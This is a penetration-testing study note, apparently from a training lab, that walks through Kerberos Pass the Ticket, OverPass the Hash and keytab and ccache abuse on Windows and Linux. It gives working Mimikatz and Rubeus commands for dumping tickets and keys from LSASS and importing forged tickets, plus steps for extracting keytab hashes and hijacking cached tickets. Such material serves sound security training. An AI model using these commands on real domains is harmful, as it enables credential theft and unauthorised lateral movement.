Another method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/).

We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)`. It can be:
- Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
# Harvesting Kerberos Tickets from Windows
On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it.

As user we can only get our _tickets_, but as local admin we can collect everything.
## Mimikatz
We can use _sekurlsa::tickets /export_ module from #mimikatz.
```cmd
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

dir *.kirbi # The result list of files with the extension `.kirbi`, which contain the tickets.
``` 

> [!NOTE] Different ticket
> _$_ -> correspond to the computer account (cmd-session 0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi)
_@_ -> correspond to user account ([randomvalue]-username@service-domain.local.kirbi)

**Note:** If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
## Robeus
We can perform the same things with #robeus.
```cmd
Rubeus.exe dump /nowrap
```
---
# Pass the Key or OverPass the Hash
The traditional `Pass the Hash (PtH)` technique involves reusing an NTLM password hash that doesn't touch Kerberos. The `Pass the Key` or `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket-Granting-Ticket (TGT)`.

For more read [Robeus docs](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash).

**DUMP User's HASH**
To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`. This module will enumerate all key types present for the Kerberos package.
```cmd
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash or Pass the Key attack using `Mimikatz` and `Rubeus`.
## Mimikatz
```cmd
mimikatz.exe
mimikatz # privilege::debug
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /ntlm:<HASH>
```

This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.
## Robeus
To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`.
```cmd
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /aes256:<HASH> /nowrap
```

We could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session.

**Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

---
# Pass The Ticket (PtT)
First in first we must  have some Kerberos tickets.
## Robeus
With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.

**Craft and Import**
```cmd
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /rc4:<HASH> /ptt
```

**Import from .kirbi file**
We can use a tickets exported from #mimikatz and import it.
```cmd
Rubeus.exe ptt /ticket:<KIRBI FILE>
```

**Import BASE64 Tickets**
Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.

_First convert a kirbi file_
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<KRIBI FILE>"))
```

Convert or use base64 output tickets from robeus.
```cmd
Rubeus.exe ptt /ticket:<BASE64 TICKET>
```
## PowerShell Remoting
Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.
```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```


The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.
```cmd
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /aes265:<HASH> /ptt
powershell
Enter-PSSession -ComputerName DC01
```

## Mimikatz 
Finally, we can also perform the Pass the Ticket attack using the Mimikatz module `kerberos::ptt` and the .kirbi file that contains the ticket we want to import.
```cmd
mimikatz.exe 
mimikatz # privilege::debug
mimikatz # kerberos::ptt "<FULL PATH to KIRBI FILE>"
```

**Note:** Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.
## PowerShell Remoting
To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new `cmd.exe` and execute mimikatz.exe, then import the ticket we collected using `kerberos::ptt`. Once the ticket is imported into our cmd.exe session, we can launch a PowerShell command prompt from the same cmd.exe and use the command `Enter-PSSession` to connect to the target machine.
```cmd
mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::ptt "<FULL PATH to KIRBI FILE>"
mimikatz # exit
powershell
Enter-PSSession -ComputerName DC01
```
---
# Linux Domain joined machine
In active directory context a sys admin can manage Linux Machine with a directory to provide centralized identity management and integrate with the organization's systems.

A Linux computer connected to Active Directory commonly uses #KERBEROS  as authentication.
## Kerberos on Linux
By default, the location of the stored Kerberos ticket is saved in the environment variable **KRB5CCNAME**, the position in a file system by default is _/tmp_.

These [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) are protected by reading and write permissions, so we have to take some high privileges.

**KEYTAB**
Another everyday use of Kerberos in Linux is with [keytab](https://kb.iu.edu/d/aumh) files. A [keytab](https://kb.iu.edu/d/aumh) is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password.

This file are stored on _/etc/krb5.keytab_.

This kind of ticket can craft in any domain join machine and shifted between them.
## Identifying Linux and AD Integration
We can use tool like  [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) for know if a machine is domain joined.
```bash
realm list
```

If in a system realm is not present we can look for other kind of tools used to integrate Linux whit AD such as [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html).
```bash
ps -ef | grep -i "winbind\|sssd"
```
## Find Tickets
_Find  kaytab_
First we can search for file with _.keytab_ extencions.
```bash
find / -name *keytab* -ls 2>/dev/null
```

***NOTE***: Like everything on linux the extensions can be omitted or changed. 

_Find in Crontab_
Often the administrator use this kind of file for integrate some service on linux with the AD.
So we can find this type of file in the crontab:
```bash
crontab -l
```

_Find in Cache file_
The path to this file is placed in the `KRB5CCNAME` environment variable.
```bash
env | grep -i krb5
ls -la /tmp                   # couse by default are stored under /tmp 
```
## Abusing KeyTab Files
With this kind of file we can impersonate a user using _kinit_.
To use a keytab file, we need to know user it was created for.
_klist_ is a tool that reads information from a _kaytab_ file.

_Read information from a KeyTab_
```bash
klist -k -t 
```

_Impersonate a User_
```bash
kinit <USER>@<DOMAIN> -k -t <PATH TO KEYTAB>
```

**Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the enviroment variable `KRB5CCNAME`.
## Keytab Extract
Other way for abusing keytab file is extracting the secret from the kaytab.
This is useful when we want to gain access to user account on the Linux machine, for do that we need to know his password.

We can use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type .keytab files, which may be used to authenticate Linux boxes to Kerberos.
```bash
python3 keytabextract.py <PATH TO KEYTAB>
```

With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.
## Abusing Cached Files
To use a ccache file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.
```bash
klist                                                  # check corrent ticket
cp /tmp/krb5cc_647401106_I8I133 .                      # copy file
export KRB5CCNAME=/root/krb5cc_647401106_I8I133        # import in env
klist                                                  # check corrent ticket
smbclient //dc01/C$ -k -c ls -no-pass                  # test if works
```
## Using Linux Attack Tools with Kerberos
For perform this action we must fulfill two principle:
- the _KRB5CCNAME_ is right set.
- we can contact the _KDC/Domain Controller_.

### Force connection to KDC/Domain Controller
In some scenario we cannot contact the Domain Controller, so we can't use them for name rosolution.
For fix that we have to proxy your traffic via the who can connect with the DC.

_Hard coded Domain Controller IP_
```bash
echo '<IP>   <DNS>' | sudo tee -a /etc/hosts
```

_Setup Proxy_
We need to modify our proxychains configuration file to use socks5 and port 1080.
```bash
cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```